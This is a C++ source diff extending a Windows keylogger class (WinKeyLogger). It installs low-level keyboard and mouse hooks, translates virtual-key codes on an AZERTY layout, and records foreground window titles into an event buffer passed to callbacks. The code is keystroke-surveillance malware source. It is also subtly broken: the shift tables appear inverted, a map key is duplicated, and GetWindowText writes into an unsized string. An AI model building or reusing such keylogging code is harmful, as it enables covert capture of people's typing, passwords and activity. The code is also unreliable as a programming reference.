@@ -114,81 +114,168 @@ namespace spi
                 return;
             }
 
-            static const std::unordered_map<char, proto::KeyCode> toBinds = {
-                {'A', proto::KeyCode::A},
-                {'Z', proto::KeyCode::Z},
-                {'E', proto::KeyCode::E},
-                {'R', proto::KeyCode::R},
-                {'T', proto::KeyCode::T},
-                {'Y', proto::KeyCode::Y},
-                {'U', proto::KeyCode::U},
-                {'I', proto::KeyCode::I},
-                {'O', proto::KeyCode::O},
-                {'P', proto::KeyCode::P},
-                {'Q', proto::KeyCode::Q},
-                {'S', proto::KeyCode::S},
-                {'D', proto::KeyCode::D},
-                {'F', proto::KeyCode::F},
-                {'G', proto::KeyCode::G},
-                {'H', proto::KeyCode::H},
-                {'J', proto::KeyCode::J},
-                {'K', proto::KeyCode::K},
-                {'L', proto::KeyCode::L},
-                {'M', proto::KeyCode::M},
-                {'W', proto::KeyCode::W},
-                {'X', proto::KeyCode::X},
-                {'C', proto::KeyCode::C},
-                {'V', proto::KeyCode::V},
-                {'B', proto::KeyCode::B},
-                {'N', proto::KeyCode::N},
-                {'a', proto::KeyCode::a},
-                {'z', proto::KeyCode::z},
-                {'e', proto::KeyCode::e},
-                {'r', proto::KeyCode::r},
-                {'t', proto::KeyCode::t},
-                {'y', proto::KeyCode::y},
-                {'u', proto::KeyCode::u},
-                {'i', proto::KeyCode::i},
-                {'o', proto::KeyCode::o},
-                {'p', proto::KeyCode::p},
-                {'q', proto::KeyCode::q},
-                {'s', proto::KeyCode::s},
-                {'d', proto::KeyCode::d},
-                {'f', proto::KeyCode::f},
-                {'g', proto::KeyCode::g},
-                {'h', proto::KeyCode::h},
-                {'j', proto::KeyCode::j},
-                {'k', proto::KeyCode::k},
-                {'l', proto::KeyCode::l},
-                {'m', proto::KeyCode::m},
-                {'w', proto::KeyCode::w},
-                {'x', proto::KeyCode::x},
-                {'c', proto::KeyCode::c},
-                {'v', proto::KeyCode::v},
-                {'b', proto::KeyCode::b},
-                {'n', proto::KeyCode::n},
-                {8,   proto::KeyCode::Backspace},
-                {9,   proto::KeyCode::Tab},
-                {27,  proto::KeyCode::Escape},
-                {32,  proto::KeyCode::Space},
-                {160, proto::KeyCode::Shift},
-                {162, proto::KeyCode::Ctrl},
-                {164, proto::KeyCode::Alt},
-                {165, proto::KeyCode::AltGr},
+            static const std::unordered_map<char, proto::KeyCode> notShifted = {
+                {'A',        proto::KeyCode::a},
+                {'Z',        proto::KeyCode::z},
+                {'E',        proto::KeyCode::e},
+                {'R',        proto::KeyCode::r},
+                {'T',        proto::KeyCode::t},
+                {'Y',        proto::KeyCode::y},
+                {'U',        proto::KeyCode::u},
+                {'I',        proto::KeyCode::i},
+                {'O',        proto::KeyCode::o},
+                {'P',        proto::KeyCode::p},
+                {'Q',        proto::KeyCode::q},
+                {'S',        proto::KeyCode::s},
+                {'D',        proto::KeyCode::d},
+                {'F',        proto::KeyCode::f},
+                {'G',        proto::KeyCode::g},
+                {'H',        proto::KeyCode::h},
+                {'J',        proto::KeyCode::j},
+                {'K',        proto::KeyCode::k},
+                {'L',        proto::KeyCode::l},
+                {'M',        proto::KeyCode::m},
+                {'W',        proto::KeyCode::w},
+                {'X',        proto::KeyCode::x},
+                {'C',        proto::KeyCode::c},
+                {'V',        proto::KeyCode::v},
+                {'B',        proto::KeyCode::b},
+                {'N',        proto::KeyCode::n},
+                {'0',        proto::KeyCode::GraveA},
+                {'1',        proto::KeyCode::Ampersand},
+                {'2',        proto::KeyCode::AcuteE},
+                {'3',        proto::KeyCode::DoubleQuote},
+                {'4',        proto::KeyCode::Quote},
+                {'5',        proto::KeyCode::OpeningParenthesis},
+                {'6',        proto::KeyCode::Dash},
+                {'7',        proto::KeyCode::GraveE},
+                {'8',        proto::KeyCode::Underscore},
+                {'9',        proto::KeyCode::CedillaC},
+                {VK_F1,      proto::KeyCode::F1},
+                {VK_F2,      proto::KeyCode::F2},
+                {VK_F3,      proto::KeyCode::F3},
+                {VK_F4,      proto::KeyCode::F4},
+                {VK_F5,      proto::KeyCode::F5},
+                {VK_F6,      proto::KeyCode::F6},
+                {VK_F7,      proto::KeyCode::F7},
+                {VK_F8,      proto::KeyCode::F8},
+                {VK_F9,      proto::KeyCode::F9},
+                {VK_F10,     proto::KeyCode::F10},
+                {VK_F11,     proto::KeyCode::F11},
+                {VK_F12,     proto::KeyCode::F12},
+                {VK_CAPITAL, proto::KeyCode::CapsLock},
+                {VK_INSERT,  proto::KeyCode::Inser},
+                {VK_DELETE,  proto::KeyCode::Delete},
+                {VK_DELETE,  proto::KeyCode::Delete},
+                {VK_BACK,    proto::KeyCode::Backspace},
+                {VK_TAB,     proto::KeyCode::Tab},
+                {VK_ESCAPE,  proto::KeyCode::Escape},
+                {VK_SPACE,   proto::KeyCode::Space},
+                {VK_RETURN,  proto::KeyCode::Enter},
+                {VK_SHIFT,   proto::KeyCode::Shift},
+                {VK_CONTROL, proto::KeyCode::Ctrl},
+                {VK_MENU,    proto::KeyCode::Alt},
+                {165,        proto::KeyCode::AltGr},
             };
+
+            static const std::unordered_map<char, proto::KeyCode> shifted = {
+                {'A',        proto::KeyCode::A},
+                {'Z',        proto::KeyCode::Z},
+                {'E',        proto::KeyCode::E},
+                {'R',        proto::KeyCode::R},
+                {'T',        proto::KeyCode::T},
+                {'Y',        proto::KeyCode::Y},
+                {'U',        proto::KeyCode::U},
+                {'I',        proto::KeyCode::I},
+                {'O',        proto::KeyCode::O},
+                {'P',        proto::KeyCode::P},
+                {'Q',        proto::KeyCode::Q},
+                {'S',        proto::KeyCode::S},
+                {'D',        proto::KeyCode::D},
+                {'F',        proto::KeyCode::F},
+                {'G',        proto::KeyCode::G},
+                {'H',        proto::KeyCode::H},
+                {'J',        proto::KeyCode::J},
+                {'K',        proto::KeyCode::K},
+                {'L',        proto::KeyCode::L},
+                {'M',        proto::KeyCode::M},
+                {'W',        proto::KeyCode::W},
+                {'X',        proto::KeyCode::X},
+                {'C',        proto::KeyCode::C},
+                {'V',        proto::KeyCode::V},
+                {'B',        proto::KeyCode::B},
+                {'N',        proto::KeyCode::N},
+                {'0',        proto::KeyCode::_0},
+                {'1',        proto::KeyCode::_1},
+                {'2',        proto::KeyCode::_2},
+                {'3',        proto::KeyCode::_3},
+                {'4',        proto::KeyCode::_4},
+                {'5',        proto::KeyCode::_5},
+                {'6',        proto::KeyCode::_6},
+                {'7',        proto::KeyCode::_7},
+                {'8',        proto::KeyCode::_8},
+                {'9',        proto::KeyCode::_9},
+                {VK_F1,      proto::KeyCode::F1},
+                {VK_F2,      proto::KeyCode::F2},
+                {VK_F3,      proto::KeyCode::F3},
+                {VK_F4,      proto::KeyCode::F4},
+                {VK_F5,      proto::KeyCode::F5},
+                {VK_F6,      proto::KeyCode::F6},
+                {VK_F7,      proto::KeyCode::F7},
+                {VK_F8,      proto::KeyCode::F8},
+                {VK_F9,      proto::KeyCode::F9},
+                {VK_F10,     proto::KeyCode::F10},
+                {VK_F11,     proto::KeyCode::F11},
+                {VK_F12,     proto::KeyCode::F12},
+                {VK_CAPITAL, proto::KeyCode::CapsLock},
+                {VK_INSERT,  proto::KeyCode::Inser},
+                {VK_DELETE,  proto::KeyCode::Delete},
+                {VK_DELETE,  proto::KeyCode::Delete},
+                {VK_BACK,    proto::KeyCode::Backspace},
+                {VK_TAB,     proto::KeyCode::Tab},
+                {VK_ESCAPE,  proto::KeyCode::Escape},
+                {VK_SPACE,   proto::KeyCode::Space},
+                {VK_RETURN,  proto::KeyCode::Enter},
+                {VK_SHIFT,   proto::KeyCode::Shift},
+                {VK_LSHIFT,  proto::KeyCode::Shift},
+                {VK_RSHIFT,  proto::KeyCode::Shift},
+                {VK_CONTROL, proto::KeyCode::Ctrl},
+                {VK_MENU,    proto::KeyCode::Alt},
+                {165,        proto::KeyCode::AltGr},
+            };
+
+            std::string tmp{};
+
+            tmp.reserve(255);
+            HWND hwnd = GetForegroundWindow();
+            GetWindowText(hwnd, tmp.data(), sizeof(char) * 256);
+            if (tmp != _activeWindowTitle) {
+                proto::WindowChanged windowChanged;
+
+                windowChanged.windowName = tmp;
+                _circularBuffer.push_back({windowChanged});
+            }
+
             if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                 auto p = (PKBDLLHOOKSTRUCT)lParam;
 
                 DWORD code = p->vkCode;
                 proto::KeyEvent keyEvent;
-                keyEvent.state = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;
+                keyEvent.state =
+                    wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;
 
                 keyEvent.timestamp = std::chrono::steady_clock::now();
-                if (toBinds.find(code) != toBinds.end()) {
-                    keyEvent.code = toBinds.at(code);
+                if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Up) {
+                    keyEvent.code = shifted.at(code);
+                } else if (_activeKeys[proto::KeyCode::Shift] == proto::KeyState::Down) {
+                    keyEvent.code = notShifted.at(code);
                 } else {
                     _log(logging::Warning) << "Unhandled KeyEvent {" << code << "}" << std::endl;
                     return;
+                }
+                if (notShifted.at(code) == proto::KeyCode::Shift) {
+                    _activeKeys[proto::KeyCode::Shift] =
+                        wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;
                 }
 
                 std::lock_guard<std::mutex> lock_guard(_bufferMutex);
@@ -227,6 +314,9 @@ namespace spi
                     case 2:
                         _mouseMoveCallback(std::move(boost::get<proto::MouseMove>(tmp)));
                         break;
+                    case 3:
+                        _windowChangeCallback(std::move(boost::get<proto::WindowChanged>(tmp)));
+                        break;
                 }
             }
             _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
@@ -248,15 +338,19 @@ namespace spi
         HHOOK _keyboardHook{};
         HHOOK _mouseHook{};
 
-        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove>;
+        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove, proto::WindowChanged>;
         boost::circular_buffer<Events> _circularBuffer;
         std::mutex _bufferMutex;
 
         std::thread _thread;
 
+        std::string _activeWindowTitle{};
+        std::unordered_map<proto::KeyCode::EnumType, proto::KeyState> _activeKeys{};
+
         static WinKeyLogger *_sharedInstance;
 
     public:
+
         static WinKeyLogger *sharedInstance() noexcept
         {
             return _sharedInstance;
